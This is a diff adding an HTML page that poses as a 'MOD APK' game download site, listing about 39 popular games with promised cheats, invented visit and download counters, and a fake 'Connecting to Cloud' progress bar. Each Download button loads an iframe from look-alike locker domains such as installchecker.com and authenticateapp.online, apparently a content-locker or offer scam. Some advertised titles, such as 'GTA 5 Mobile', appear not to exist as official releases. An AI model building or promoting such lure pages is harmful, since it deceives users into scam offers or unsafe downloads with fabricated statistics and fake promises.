@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MOD APK</title>
+    
+    <style>
+        :root {
+            --bg: #f8f9fa;
+            --card: #ffffff;
+            --text: #1a1a1a;
+            --primary: #22c55e;
+            --desc: #6c757d;
+            --border: #e0e0e0;
+        }
+
+        body.dark {
+            --bg: #0b0b0b;
+            --card: #161616;
+            --text: #f0f0f0;
+            --desc: #999999;
+            --border: #2a2a2a;
+        }
+
+        body { margin: 0; font-family: sans-serif; background: var(--bg); color: var(--text); transition: 0.3s; }
+        h1 { text-align: center; color: var(--primary); padding: 25px 0 10px 0; margin: 0; font-size: 28px; }
+
+        .search {
+            width: 90%; margin: 15px auto; display: block; padding: 15px;
+            border-radius: 30px; border: 1px solid var(--border); 
+            background: var(--card); color: var(--text); outline: none;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+        }
+
+        .stats { display: flex; justify-content: center; gap: 20px; padding: 5px; font-size: 13px; color: var(--primary); font-weight: bold; }
+
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 20px; padding: 20px;
+        }
+
+        @media(max-width:600px) {
+            .grid { grid-template-columns: repeat(2, 1fr); gap: 12px; padding: 12px; }
+            .game-card img { height: 130px; }
+        }
+
+        .game-card {
+            background: var(--card); border-radius: 20px; overflow: hidden;
+            position: relative; display: flex; flex-direction: column;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.06); transition: 0.3s;
+            border: 1px solid var(--border);
+        }
+
+        .game-card img { width: 100%; height: 180px; object-fit: cover; background: #eee; }
+        .content { padding: 15px; display: flex; flex-direction: column; gap: 8px; flex-grow: 1; }
+        .title { font-weight: bold; color: var(--primary); font-size: 15px; }
+        .desc { font-size: 11px; color: var(--desc); line-height: 1.4; height: 32px; overflow: hidden; }
+        
+        button.btn {
+            background: var(--primary); border: none; padding: 12px;
+            border-radius: 12px; font-weight: bold; cursor: pointer;
+            margin-top: auto; color: #fff;
+        }
+
+        .tag {
+            position: absolute; top: 10px; right: 10px;
+            background: var(--primary); color: #fff; padding: 4px 10px;
+            border-radius: 10px; font-size: 10px; font-weight: bold; z-index: 5;
+        }
+
+        .modal {
+            display: none; position: fixed; inset: 0;
+            background: rgba(0,0,0,.95); justify-content: center;
+            align-items: center; z-index: 9999;
+        }
+
+        .modal-box {
+            background: var(--card); width: 95%; max-width: 500px;
+            border-radius: 25px; position: relative; overflow: hidden;
+        }
+
+        #loading-section { padding: 40px 20px; text-align: center; }
+        .bar-wrap { height: 12px; background: #eee; border-radius: 20px; overflow: hidden; margin: 20px 0; }
+        #bar { height: 100%; width: 0; background: var(--primary); transition: .2s; }
+        #frame { width: 100%; height: 600px; border: none; display: none; }
+    </style>
+</head>
+<body>
+
+    <h1>MOD GAMES</h1>
+
+    <div class="stats">
+        <div>👁 Visits: 4,872,391</div>
+        <div>⬇ Downloads: 27,459,872</div>
+    </div>
+    
+    <button onclick="toggleTheme()" style="position:fixed; top:15px; right:15px; z-index:1000; background:var(--primary); border:none; border-radius:50%; width:45px; height:45px; cursor:pointer; color:white; font-size:22px;">🌓</button>
+    
+    <input id="search" class="search" placeholder="Search from all MOD games...">
+
+    <div class="grid" id="grid"></div>
+
+    <div class="modal" id="modal">
+        <div class="modal-box">
+            <span onclick="closeModal()" style="cursor:pointer; font-size:35px; position:absolute; top:10px; right:20px; z-index:10001; color:var(--text);">&times;</span>
+            <div id="loading-section">
+                <h2 style="color:var(--primary)">Connecting to Cloud...</h2>
+                <div class="bar-wrap"><div id="bar"></div></div>
+                <p style="color:var(--desc); font-size:12px">Please wait, link is generating...</p>
+            </div>
+            <iframe id="frame"></iframe>
+        </div>
+    </div>
+
+<script>
+    const allGames = [
+        ["Temple Run 2", "https://i.postimg.cc/Jh09gPHb/images.webp", "https://checkmyapp.store/cl/i/d2ovpk", "4.8", "3.0M", "Unlimited coins • All characters"],
+        ["Poppy Playtime 5", "https://i.postimg.cc/RCW4g6rv/images-(2).jpg", "https://authenticateapp.online/cl/i/5nll2k", "4.9", "1.5M", "Full Version • All Chapters • No ADS"],
+        ["Fifa Street 2 Mobile", "https://i.postimg.cc/gcwd46F6/fifa-street-2.png", "https://authenticateapp.online/cl/i/7jvjgk", "4.8", "2.2M", "All Teams Unlocked • Max Skills • Classic Mod"],
+        ["Spider-Man 2 Mobile", "https://i.postimg.cc/FHLX56wW/images-(1).jpg", "https://checkmyapp.store/cl/i/m53ek8", "4.9", "3.4M", "Open World • Suit Mods • HD Graphics"],
+        ["CarX Drift Racing 2", "https://i.postimg.cc/76R13gHD/1683877186-carx-drift-racing-2.png", "https://authenticateapp.online/cl/i/34l4xm", "4.9", "4.1M", "Unlimited Money • All Cars Unlocked • Drift Mod"],
+        ["Real Racing 3", "https://i.postimg.cc/Ss2h5p1z/59d734a3a0393d260f23865083fd2e18.jpg", "https://lockedapp.net/cl/i/mer9l4", "4.9", "2.8M", "Unlimited money • All cars"],
+        ["GTA 5 Mobile", "https://upload.wikimedia.org/wikipedia/en/a/a5/Grand_Theft_Auto_V.png", "https://installchecker.com/cl/i/o6n7m2", "4.7", "5.1M", "Full Game • Unlimited money"],
+        ["Snake Mod Menu", "https://i.postimg.cc/j51BnqYy/NG4s-ZTG49qp-KGd3t-Uxdoxb-W2EXSp1-n-Axc-Yr3XCO0SO1WO5P2s-Wkk0s-Bt-UGZPYz-POU0-s150-rw.png", "https://authenticateapp.online/cl/i/34l4j7", "4.7", "1.2M", "God Mode • Speed Hack • All Skins Unlocked"],
+        ["Minecraft", "https://i.postimg.cc/cHHJqfpb/3ff42c8168cb146b6a0458e6b81c8d2e.jpg", "https://installchecker.com/cl/i/volvmx", "5.0", "4.2M", "Official Mod • All skins"],
+        ["Terraria", "https://cdn.cloudflare.steamstatic.com/steam/apps/105600/header.jpg", "https://installchecker.com/cl/i/g6p592", "4.8", "1.9M", "God mode • Unlimited items"],
+        ["Dead Trigger 2", "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTeVXv_WH25sdbzNee5mGGSNZcgrdbHfyjDGtY7r6AYyA&s", "https://installchecker.com/cl/i/volkd2", "4.6", "1.4M", "Unlimited ammo & weapons"],
+        ["Granny", "https://www.pngkey.com/png/detail/300-3001204_granny-sticker-granny-horror-game-costume.png", "https://installchecker.com/cl/i/dv8r3w", "4.5", "3.7M", "God mode • No ADS"],
+        ["Jetpack Joyride", "https://images.launchbox-app.com/efa13945-48d2-4a08-a507-f27cf6bef1b8.png", "https://installchecker.com/cl/i/r722n4", "4.8", "2.1M", "Unlimited coins • All jets"],
+        ["Asphalt 8", "https://i.postimg.cc/1X1DzH47/da6894949fa87d0a60fbe4022d5de3a2.jpg", "https://installchecker.com/cl/i/ndk8w9", "4.9", "3.5M", "All cars unlocked • Max speed"],
+        ["Shadow Fight 3", "https://i.postimg.cc/HxwXtKm1/fdee4ab6e6875d72d84d05a4c977555e.jpg", "https://installchecker.com/cl/i/37xen6", "4.7", "2.6M", "Unlimited gems & Shadow power"],
+        ["Madfut 25", "https://i.postimg.cc/zf3f6CZP/download-5.jpg", "https://installchecker.com/cl/i/qk7e26", "4.6", "1.8M", "Unlimited packs • New cards"],
+        ["Zombie Catchers", "https://i.postimg.cc/QdkVCP7Z/b25d3f7258c599d00eb5f9dad2bff200.jpg", "https://installchecker.com/cl/i/qk7ed4", "4.8", "2.3M", "Unlimited coins • All levels"],
+        ["Modern Combat 5", "https://i.postimg.cc/pLnqBfcM/0ea3ead68ff72e83c6a758ee22a0325f.jpg", "https://installchecker.com/cl/i/7dgdw9", "4.5", "1.6M", "Unlimited ammo • Anti-ban"],
+        ["Football League 2025", "https://i.postimg.cc/ncDknT3B/2aef3e1f170c3941d0cce829192d9c3b.jpg", "https://installchecker.com/cl/i/po8q9l", "4.9", "2.9M", "All teams • Unlimited money"],
+        ["Into the Dead 2", "https://i.postimg.cc/FHFWWMPg/9fe5d0c6e4fb3a3fff88499966f15bd1.jpg", "https://installchecker.com/cl/i/o6w55q", "4.7", "1.7M", "Unlimited gems • All weapons"],
+        ["MadOut2 BigCity", "https://i.postimg.cc/d3mdM6Cr/906806bde826c9dfa39075643435217a.jpg", "https://applocked.org/cl/i/4oqd24", "4.8", "2.4M", "Unlimited money • Online Mod"],
+        ["Cover Fire", "https://i.postimg.cc/NG4w4Pwm/052e16397cb7b90b15e4dac048bbc369.jpg", "https://lockedapp.org/cl/i/m52lg4", "4.6", "1.5M", "Unlimited money • All VIP"],
+        ["BitLife", "https://i.postimg.cc/tJmRYM0f/955488d3c0d197fd0e3973d92ad718dd.jpg", "https://lockedapp.store/cl/i/n662pv", "4.9", "4.1M", "God mode • Bitizenship"],
+        ["Plague Inc", "https://i.postimg.cc/BQ10NsPH/02d2e0c943d34331dd722a06ef9efc03.jpg", "https://applocked.store/cl/i/4oo9wx", "4.8", "2.2M", "Unlimited DNA • All diseases"],
+        ["Rebel Inc", "https://i.postimg.cc/Wbm7ry3X/2df0d3efe8ed56b0bb83ac277374cc7a.jpg", "https://checkapp.online/cl/i/qnndq4", "4.7", "1.3M", "Premium Unlocked • All maps"],
+        ["Hill Climb Racing 2", "https://i.postimg.cc/rsP4g4D7/aa3be2a2e638d5397e9ff23d1068a568.jpg", "https://checkapp.online/cl/i/l771g6", "4.9", "3.2M", "Unlimited coins • All vehicles"],
+        ["Alto’s Adventure", "https://i.postimg.cc/wymvtvYy/altos-adventure.jpg", "https://confirmapp.site/cl/i/pqqng4", "4.5", "1.1M", "Unlimited coins • All items"],
+        ["The Spike Volleyball", "https://thespikevolleyball.com/wp-content/uploads/2025/08/The-Spike-Mod-APK-2.webp", "https://appchecker.site/cl/i/exxwkm", "4.8", "1.9M", "Unlimited gems • Max level"],
+        ["CarX Street", "https://images.steamusercontent.com/ugc/9641494513987972998/D7529D5BEF2E4AE51224AD7FC3AC3998D450428F/", "https://checkapp.online/cl/i/grr8pd", "4.7", "2.5M", "Unlimited money • Drift Mod"],
+        ["GTA LA Crimes", "https://i.postimg.cc/Pqp7hf2P/622662a266a03ab7ee561cecda51c6a7.jpg", "https://appchecker.store/cl/i/krr9qe", "4.6", "1.8M", "Unlimited health • All cars"],
+        ["Dream League 2026", "https://i.postimg.cc/NMnrRyFG/39b6681f328367cd9ebfc5f444480e86.jpg", "https://appchecker.site/cl/i/w66kpv", "4.9", "3.8M", "Unlimited coins • All players"],
+        ["Madden NFL 26", "https://i.postimg.cc/XqQRPt9g/ddafd8b13cfe21e445a65c626957b372-(1).jpg", "https://appchecker.site/cl/i/4oo33r", "4.8", "2.7M", "Unlimited stats • All teams"],
+        ["Stumble Guys 2026", "https://i.postimg.cc/jdq2Fg30/288f59ad4205a9503c3a91cb016e032a.jpg", "https://appchecker.site/cl/i/m55ren", "4.9", "4.5M", "All skins • All emotes"],
+        ["Retro Bowl", "https://i.postimg.cc/8cBgT1XT/unnamed-(2).webp", "https://checkmyapp.site/cl/i/n66lx6", "4.9", "2.1M", "Unlimited coaching credits"],
+        ["R6 Mobile Beta", "https://i.postimg.cc/FstsX2L0/c7e4082374e7ecc4a7fc33ccbc0ca552.jpg", "https://appchecker.site/cl/i/822pk6", "4.8", "1.7M", "All operators unlocked"],
+        ["COD Zombies", "https://i.postimg.cc/Mpr53bnr/4ef9e719439798004edefa37d6f5cc42.jpg", "https://appchecker.store/cl/i/pqq845", "4.9", "3.2M", "Unlimited points • All maps"],
+        ["Speed Stars 2026", "https://i.postimg.cc/RZGgTrfn/baeb948e5f0251d4065b19038b57db4a.jpg", "https://checkmyapp.site/cl/i/4ooxex", "4.8", "1.4M", "Max speed • All cars"],
+        ["Block Blast", "https://i.postimg.cc/4yvc1WyY/50f9c884389b8a04f0393fec510c00b8.jpg", "https://checkmyapp.store/cl/i/krv7oe", "4.9", "2.9M", "Unlimited points • All themes"],
+        ["BeamNG.drive", "https://i.postimg.cc/y60nsB6F/779488e457a22a3592a631f255172ebd.jpg", "https://checkmyapp.store/cl/i/82v7q3", "4.9", "2.6M", "Realistic physics • All cars"]
+    ];
+
+    function render(data) {
+        let grid = document.getElementById("grid");
+        let html = "";
+        for(let i=0; i<data.length; i++) {
+            let g = data[i];
+            html += `
+            <div class="game-card">
+                <span class="tag">MOD</span>
+                <img loading="lazy" src="${g[1]}" alt="${g[0]}">
+                <div class="content">
+                    <div class="title">${g[0]}</div>
+                    <div class="meta">
+                        <div>⭐ ${g[3]}</div>
+                        <div style="color:#22c55e; font-weight:bold">${g[4]}</div>
+                    </div>
+                    <div class="desc">${g[5]}</div>
+                    <button class="btn" onclick="openModal('${g[2]}')">Download</button>
+                </div>
+            </div>`;
+        }
+        grid.innerHTML = html;
+    }
+
+    document.getElementById("search").oninput = function(e) {
+        let val = e.target.value.toLowerCase();
+        let filtered = allGames.filter(g => g[0].toLowerCase().includes(val));
+        render(filtered);
+    };
+
+    function openModal(link) {
+        let m=document.getElementById("modal"), 
+            b=document.getElementById("bar"), 
+            s=document.getElementById("loading-section"), 
+            f=document.getElementById("frame");
+        
+        m.style.display="flex"; 
+        f.style.display="none"; 
+        s.style.display="block"; 
+        b.style.width="0";
+
+        f.src = link; 
+
+        let p=0;
+        let t = setInterval(()=>{
+            p += 5; 
+            b.style.width = p + "%";
+            
+            if(p >= 100) {
+                clearInterval(t);
+                s.style.display="none"; 
+                f.style.display = "block"; 
+            }
+        }, 100);
+    }
+
+    function closeModal(){ document.getElementById("modal").style.display="none"; document.getElementById("frame").src=""; }
+    function toggleTheme(){ document.body.classList.toggle("dark"); }
+    render(allGames);
+</script>
+</body>
+</html>
